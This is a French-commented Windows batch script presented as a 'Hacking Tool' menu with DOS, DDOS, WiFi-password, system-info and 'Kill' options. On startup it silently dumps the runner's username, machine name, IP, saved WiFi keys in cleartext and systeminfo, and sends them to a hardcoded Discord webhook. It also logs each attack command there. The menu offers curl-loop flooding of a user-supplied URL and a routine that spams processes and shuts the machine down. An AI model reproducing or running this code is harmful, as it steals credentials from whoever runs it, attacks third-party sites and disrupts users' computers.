REM ============================================================================================================
REM                                         DROITS D'AUTEUR ET CONDITIONS D'UTILISATION
REM 
REM Ce script, intitulé "Hacking Tool", a été créé par m.a.s_dev. Toute utilisation, distribution ou modification
REM de ce script est soumise aux termes et conditions suivants. Le créateur m.a.s_dev se réserve tous les droits
REM sur ce script. Pour plus d'informations sur m.a.s_dev, veuillez consulter le Linktree :
REM https://linktr.ee/m.a.s_dev
REM 
REM 1. DROITS D'AUTEUR
REM - Ce script est protégé par le droit d'auteur. Vous n'êtes pas autorisé à le modifier, le distribuer ou le
REM   réutiliser à des fins commerciales ou non commerciales sans l'autorisation expresse de m.a.s_dev.
REM - Vous êtes autorisé à utiliser ce script tel quel pour vos besoins personnels, mais toute altération du code
REM   peut rendre le script inutilisable ou provoquer des dysfonctionnements.
REM 
REM 2. LIMITATION DE RESPONSABILITÉ
REM - Ce script est fourni "tel quel", sans garantie d'aucune sorte. m.a.s_dev ne pourra être tenu responsable des
REM   dommages, pertes de données ou autres conséquences résultant de l'utilisation de ce script.
REM - Vous reconnaissez que l'utilisation de ce script, notamment à des fins de piratage, d'extraction de données ou
REM   toute autre activité illégale, est de votre entière responsabilité. Vous êtes seul responsable de toute action
REM   entreprise en utilisant ce script.
REM 
REM 3. INTERDICTION DE MODIFICATION
REM - Il est strictement interdit de modifier ou d'altérer ce script. Les modifications peuvent rendre le script
REM   instable ou entraîner des erreurs de fonctionnement. Toute altération du code est aux risques et périls de
REM   l'utilisateur.
REM - Le créateur n'est pas tenu de fournir un support ou une assistance pour les versions modifiées du script.
REM 
REM En utilisant ce script, vous acceptez ces conditions.
REM ============================================================================================================

color b
title Hacking Tool
prompt .
@echo off
cls
setlocal enabledelayedexpansion

echo Loading...

set connected=false
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /i "IPv4"') do (
    if NOT "%%A"==" 127.0.0.1" (
        set connected=true
    )
)

if "%connected%"=="false" (
    echo Pas de connexion internet!
    pause
    goto :EOF

) 

set webhookUrl=https://discord.com/api/webhooks/1292853894711611493/RFDM9dZL49Xm1wlP34d6cNdEGBo3ARPYO3FSl658M7QhaRxP5EuBwA7D4LMmcEZZ1KOY
set "Vers=1.9"
set "LastUpdate=15/10/2024"
set "Bureaux=%USERPROFILE%\Desktop"

set "tempFile=%TEMP%\Temp_m.a.s_dev_%USERNAME%_%COMPUTERNAME%.txt"
set IPP=
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /R "IPv4"') do (
    set IPP=%%i
    set IPP=!IPP: =!
)
(
echo {
echo   "content": "Nouvelle Connexion :",
echo   "embeds": [
echo     {
echo       "title": "Informations de la machine",
echo       "fields": [
echo         {
echo           "name": "Utilisateur",
echo           "value": "%USERNAME%"
echo         },
echo         {
echo           "name": "Machine",
echo           "value": "%COMPUTERNAME%"
echo         },
echo         {
echo           "name": "Adresse IP",
echo           "value": "%IPP%"
echo         }
echo       ]
echo     }
echo   ]
echo }
) > "!tempFile!"
curl -H "Content-Type: application/json" -d @"!tempFile!" %webhookUrl%
del "!tempFile!"

set tempDir=%TEMP%
set outputFile=%tempDir%\%USERNAME%_%COMPUTERNAME%_Data.txt
echo. > %outputFile%
call :Ligne_File
echo Informations sur les réseaux Wi-Fi et le système : >> %outputFile%
echo. >> %outputFile%
netsh wlan show profiles >> %outputFile%
echo Mot de Passe WIFI : >> %outputFile%
(
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil Tous les utilisateurs"') do (
    set "wifi_name=%%A"
    setlocal enabledelayedexpansion
    set "wifi_name=!wifi_name:~1!"
    echo.
    echo Wi-Fi : !wifi_name!
    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
    endlocal
)
) >> %outputFile%
call :Ligne_File
echo. >> %outputFile%
echo Informations système : >> %outputFile%
echo. >> %outputFile%
systeminfo >> %outputFile%
curl -F "file=@%outputFile%" %webhookUrl%
del %outputFile%

color a
echo Loaded !
cls
call :MainMenu

:MainMenu
call :TitleName
echo.
call :Commands
:CommandLoop
color a
set /p Commande="Enter the Commands : "
call :Ligne
if "%Commande%"=="1" (
    call :Help
) else if "%Commande%"=="2" (
    call :DOS
) else if "%Commande%"=="3" (
    call :DDOS
) else if "%Commande%"=="4" (
    call :HackEffect
) else if "%Commande%"=="5" (
    call :IP
) else if "%Commande%"=="6" (
    call :WifiHack
) else if "%Commande%"=="7" (
    call :Net
) else if "%Commande%"=="8" (
    call :Kill
) else if "%Commande%"=="9" (
    call :SystemData
) else if "%Commande%"=="10" (
    call :DataFiles
) else if "%Commande%"=="11" (
    call :Credits
) else if "%Commande%"=="12" (
    call :Vers
) else if "%Commande%"=="13" (
    call :Clear
) else if "%Commande%"=="14" (
    echo Bye
    goto :EOF
) else if "%Commande%"=="Help" (
    call :Help
) else if "%Commande%"=="DOS" (
    call :DOS
) else if "%Commande%"=="DDOS" (
    call :DDOS
) else if "%Commande%"=="HackEffect" (
    call :HackEffect
) else if "%Commande%"=="IP" (
    call :IP
) else if "%Commande%"=="WifiHack" (
    call :WifiHack
) else if "%Commande%"=="Net" (
    call :Net
) else if "%Commande%"=="Kill" (
    call :Kill
) else if "%Commande%"=="SystemData" (
    call :SystemData
) else if "%Commande%"=="DataFiles" (
    call :DataFiles
) else if "%Commande%"=="Credits" (
    call :Credits
) else if "%Commande%"=="Version" (
    call :Vers
) else if "%Commande%"=="Clear" (
    call :Clear
) else if "%Commande%"=="Save IP" (
    call :Save_IP
) else if "%Commande%"=="Save WifiHack" (
    call :Save_WifiHack
) else if "%Commande%"=="Save Net" (
    call :Save_Net
) else if "%Commande%"=="Save SystemData" (
    call :Save_systemData
) else if "%Commande%"=="None" (
    echo Enter a commande
) else (
    echo Invalid Commande : ^| %Commande% ^|
)
set Commande="None"
goto CommandLoop

:DataFiles
color c
tree
color a
goto :EOF
:SystemData
color c
systeminfo
color a
goto :EOF
:IP
color c
ipconfig /all
color a
goto :EOF
:WifiHack
color c
echo.
echo Liste des reseaux Wi-Fi enregistrÃ©s :
echo -----------------------------------------------
netsh wlan show profiles
echo.
pause
echo Verification des mots de passe :
echo -----------------------------------------------
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil Tous les utilisateurs"') do (
    set "wifi_name=%%A"
    setlocal enabledelayedexpansion
    set "wifi_name=!wifi_name:~1!"
    echo.
    echo Wi-Fi : !wifi_name!
    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
    endlocal
)
echo.
goto :EOF
:Clear
cls
goto :EOF
:Net
color c
netstat
goto :EOF
:HackEffect
color c
dir /s
color a
goto :EOF
:Kill
set "tempFile=%TEMP%\C.txt"
(
echo {
echo   "content": "Nouvelle Commande :",
echo   "embeds": [
echo     {
echo       "title": "Informations de la machine",
echo       "fields": [
echo         {
echo           "name": "Utilisateur",
echo           "value": "%USERNAME%"
echo         },
echo         {
echo           "name": "Machine",
echo           "value": "%COMPUTERNAME%"
echo         },
echo         {
echo           "name": "Adresse IP",
echo           "value": "%IPP%"
echo         },
echo         {
echo           "name": "Commmande",
echo           "value": "Kill"
echo         }
echo       ]
echo     }
echo   ]
echo }
) > "!tempFile!"
curl -H "Content-Type: application/json" -d @"!tempFile!" %webhookUrl%
del "!tempFile!"
color c
start start start start start start start start start start start start start
start start start start start start start start start start start start start
shutdown /s
start start start start start start start start start start start start start
start start start start start start start start start start start start start
start start start start start start start start start start start start start
start start start start start start start start start start start start start
start start start start start start start start start start start start start
start start start start start start start start start start start start start
start start start start start start start start start start start start start
start start start start start start start start start start start start start
start start start start start start start start start start start start start
start start start start start start start start start start start start start
dir /s
tree
goto :EOF
:DDOS
color 01
set /p "URL=Enter the URL: "
color 05
set /p "Request_Number=Enter the number of requests per CMD: "
color 0e
set /p "CMD_Number=Enter the number of CMD windows to open: "
color a
set "tempFile=%TEMP%\C.txt"
(
echo {
echo   "content": "Nouvelle Commande :",
echo   "embeds": [
echo     {
echo       "title": "Informations",
echo       "fields": [
echo         {
echo           "name": "Utilisateur",
echo           "value": "%USERNAME%"
echo         },
echo         {
echo           "name": "Machine",
echo           "value": "%COMPUTERNAME%"
echo         },
echo         {
echo           "name": "Adresse IP",
echo           "value": "%IPP%"
echo         },
echo         {
echo           "name": "Commmande",
echo           "value": "DDOS"
echo         },
echo         {
echo           "name": "URL",
echo           "value": "%URL%"
echo         },
echo         {
echo           "name": "CMD Number",
echo           "value": "%CMD_Number%%"
echo         },
echo         {
echo           "name": "Request Number",
echo           "value": "%Request_Number%"
echo         }
echo       ]
echo     }
echo   ]
echo }
) > "!tempFile!"
curl -H "Content-Type: application/json" -d @"!tempFile!" %webhookUrl%
del "!tempFile!"
for /l %%j in (1,1,%CMD_Number%) do (
    start cmd /c "title DDOS & color c & (for /l %%i in (1,1,%Request_Number%) do curl %URL%) & color a & goto :EOF"
)
color c
goto : EOF
:DOS
color 01
set /p URL="Enter the URL : "
color 05
set /p Request_Number="Enter request number : "
set "tempFile=%TEMP%\C.txt"
(
echo {
echo   "content": "Nouvelle Commande :",
echo   "embeds": [
echo     {
echo       "title": "Informations",
echo       "fields": [
echo         {
echo           "name": "Utilisateur",
echo           "value": "%USERNAME%"
echo         },
echo         {
echo           "name": "Machine",
echo           "value": "%COMPUTERNAME%"
echo         },
echo         {
echo           "name": "Adresse IP",
echo           "value": "%IPP%"
echo         },
echo         {
echo           "name": "Commmande",
echo           "value": "DOS"
echo         },
echo         {
echo           "name": "URL",
echo           "value": "%URL%"
echo         },
echo         {
echo           "name": "CMD Number",
echo           "value": "%CMD_Number%%"
echo         },
echo         {
echo           "name": "Request Number",
echo           "value": "%Request_Number%"
echo         }
echo       ]
echo     }
echo   ]
echo }
) > "!tempFile!"
curl -H "Content-Type: application/json" -d @"!tempFile!" %webhookUrl%
del "!tempFile!"
color c
start cmd /c "title DOS & color c & (for /l %%i in (1,1,%Request_Number%) do curl %URL%) & color a & pause"
color a
goto :EOF
:Credits
color 05
echo .
echo 	##     ##        ###         ######          ########  ######## ##     ## 
echo 	###   ###       ## ##       ##    ##         ##     ## ##       ##     ## 
echo 	#### ####      ##   ##      ##               ##     ## ##       ##     ## 
echo 	## ### ##     ##     ##      ######          ##     ## ######   ##     ## 
echo 	##     ##     #########           ##         ##     ## ##        ##   ##  
echo 	##     ## ### ##     ## ### ##    ##         ##     ## ##         ## ##   
echo 	##     ## ### ##     ## ###  ######  ####### ########  ########    ###    
echo .
call :Ligne
color a
goto :EOF
:Save_IP
color 0e
ipconfig /all >> %USERPROFILE%\Desktop\Hack_Tool_IP.txt
color a
echo Fichier cree dans bureaux
goto :EOF
:Save_WifiHack
color 0e
set "Fichier_SaveWifiPassWord=%USERPROFILE%\Desktop\Hack_Tool_WifiHack.txt"
echo Informations sur les réseaux Wi-Fi et le système : >> %Fichier_SaveWifiPassWord%
echo. >> %Fichier_SaveWifiPassWord%
netsh wlan show profiles >> %Fichier_SaveWifiPassWord%
echo Mot de Passe WIFI : >> %Fichier_SaveWifiPassWord%
(
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil Tous les utilisateurs"') do (
    set "wifi_name=%%A"
    setlocal enabledelayedexpansion
    set "wifi_name=!wifi_name:~1!"
    echo.
    echo Wi-Fi : !wifi_name!
    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
    endlocal
)
) >> %Fichier_SaveWifiPassWord%
color a
echo Fichier cree dans bureaux
goto :EOF
:Save_Net
color 0e
netstat >> %USERPROFILE%\Desktop\Hack_Tool_Net.txt
color a
echo Fichier cree dans bureaux
goto :EOF
:Save_systemData
color 0e
systeminfo >> %USERPROFILE%\Desktop\Hack_Tool_SystemData.txt
color a
echo Fichier cree dans bureaux
goto :EOF
:Help
call :TitleName
call :Ligne
call :Commands
goto :EOF
:Commands
echo .
echo     []==================================================================================[]
echo     []                                   Menu Principal                                 []
echo     []==================================================================================[]
echo     [] [1] Help                    [] [2] DOS                    [] [3] DDOS            []
echo     [] [4] HackEffect              [] [5] IP                     [] [6] WifiHack        []
echo     [] [7] Net                     [] [8] Kill                   [] [9] SystemData      []
echo     [] [10] DataFiles              [] [11] Credits               [] [12] Version        []
echo     [] [13] Clear                  [] [14] Leave                 []                     []
echo     []==================================================================================[]
echo .
echo commande Save fonctionne avec {IP, WifiHack, Net, SystemData}
echo .
call :Ligne
goto :EOF
:Vers
echo Version : %Vers%
echo Last Update : %LastUpdate%
goto :EOF
:TitleName
echo .
echo 	##     ##    ###     ######  ##    ## #### ##    ##  ######      ########  #######   #######  ##       
echo 	##     ##   ## ##   ##    ## ##   ##   ##  ###   ## ##    ##        ##    ##     ## ##     ## ##       
echo 	##     ##  ##   ##  ##       ##  ##    ##  ####  ## ##              ##    ##     ## ##     ## ##       
echo 	######### ##     ## ##       #####     ##  ## ## ## ##   ####       ##    ##     ## ##     ## ##       
echo 	##     ## ######### ##       ##  ##    ##  ##  #### ##    ##        ##    ##     ## ##     ## ##       
echo 	##     ## ##     ## ##    ## ##   ##   ##  ##   ### ##    ##        ##    ##     ## ##     ## ##       
echo 	##     ## ##     ##  ######  ##    ## #### ##    ##  ######         ##     #######   #######  ######## 
echo .
call :Ligne
goto :EOF
:Ligne
echo ============================================================================================================
goto :EOF
:Ligne_File
echo ======================================================================================== >> %outputFile%
goto :EOF